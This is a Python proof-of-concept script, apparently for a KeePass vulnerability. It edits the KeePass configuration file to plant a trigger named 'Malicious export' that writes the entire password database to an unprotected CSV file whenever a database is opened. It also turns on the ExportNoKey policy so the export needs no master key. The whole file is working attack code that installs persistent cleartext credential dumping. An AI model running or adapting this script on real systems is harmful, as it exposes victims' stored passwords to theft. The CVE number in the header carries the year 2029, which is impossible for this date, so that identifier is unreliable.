import os
from lxml import etree

print('CVE-2029-24055 POC')
print('======================')
print('!!! Warning !!!')
print('!!! This tool will try to add a Trigger so that the KeePass database is exported without protection!')
print('!!! This tool does not check for anything and will just overwrite whatever it wants to!')
print('!!! No backup, no mercy! Chances are high that this tool will leave your KeePass config in a corrupted state!')
print('!!! No functionality is guaranteed! Use at your own risk!')
print('See: https://sourceforge.net/p/keepass/discussion/329220/thread/a146e5cf6b/')
print('======================')
if os.name != 'nt':
    print('Sorry, this tool works only under Windows!')
    exit(1)

# Get path to default config
config_file=os.getenv('APPDATA')+"\KeePass\KeePass.config.xml"
print(f"Reading from this config file: {config_file}")

# Read Config
tree = etree.parse(config_file)
root = tree.getroot()

# parse trough all Triggers to remove old versions
for trigger in root.findall("./Application/TriggerSystem/Triggers/"):
    if trigger.find('Guid').text == "yjxXO87yOkOtkWWCrf2CXQ==":
        print("Removing old trigger!")
        parent = trigger.getparent()
        parent.remove(trigger)

# Add malicious content
triggers = root.find("./Application/TriggerSystem/")
new_trigger = etree.SubElement(triggers, "Trigger")
new_guid    = etree.SubElement(new_trigger, "Guid")
new_guid.text    = "yjxXO87yOkOtkWWCrf2CXQ=="
new_name    = etree.SubElement(new_trigger, "Name")
new_name.text    = "Malicious export"
new_events = etree.SubElement(new_trigger, "Events")
new_event = etree.SubElement(new_events, "Event")
new_typeguid = etree.SubElement(new_event, "TypeGuid")
new_typeguid.text = "5f8TBoW4QYm5BvaeKztApw==" # on openening database...
new_parameters = etree.SubElement(new_event, "Parameters")
new_parameter = etree.SubElement(new_parameters, "Parameter")
new_parameter.text = "0"
etree.SubElement(new_parameters, "Parameter")
etree.SubElement(new_trigger, "Conditions")
new_actions = etree.SubElement(new_trigger, "Actions")
new_action = etree.SubElement(new_actions, "Action")
new_typeguid = etree.SubElement(new_action, "TypeGuid")
new_typeguid.text = "D5prW87VRr65NO2xP5RIIg==" # ... do malicious export
new_parameters = etree.SubElement(new_action, "Parameters")
new_parameter = etree.SubElement(new_parameters, "Parameter")
new_parameter.text = "c:\\Users\\%USERNAME%\\KeepassExport.csv"
new_parameter = etree.SubElement(new_parameters, "Parameter")
new_parameter.text = "KeePass CSV (1.x)"
etree.SubElement(new_parameters, "Parameter")
etree.SubElement(new_parameters, "Parameter")

# Disable Security policy
exportnokey = root.find("./Security/Policy/ExportNoKey")
try:
    print("Removing old Policy!")
    parent = exportnokey.getparent()
    parent.remove(exportnokey)
except:
    pass

policy = root.find("./Security/Policy")
export_no_key = etree.SubElement(policy, "ExportNoKey")
export_no_key.text = "true"

#config_file=os.getenv('APPDATA')+"\KeePass\KeePass.config-BAK.xml"
tree.write(config_file, encoding='utf-8', xml_declaration=True)